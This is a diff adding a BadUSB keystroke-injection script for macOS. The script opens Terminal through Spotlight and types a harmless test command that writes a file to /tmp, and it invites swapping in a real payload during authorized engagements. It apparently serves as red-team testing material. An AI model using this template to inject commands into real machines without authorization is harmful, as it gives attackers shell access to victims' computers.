@@ -1,0 +1,22 @@
+REM BadUSB - macOS Terminal Command Execution
+REM Target: macOS (tested on Ventura/Sonoma)
+REM Opens Terminal via Spotlight and runs a safe test command
+REM MITRE ATT&CK: T1059.004
+
+REM Wait for host to be ready
+DELAY 1000
+
+REM Open Spotlight
+GUI SPACE
+DELAY 600
+
+REM Type Terminal and launch it
+STRING Terminal
+DELAY 400
+ENTER
+DELAY 1500
+
+REM Execute test payload - writes to /tmp to confirm execution
+REM Replace with actual payload in authorized engagements
+STRING echo 'badusb_test' > /tmp/badusb_test.txt
+ENTER
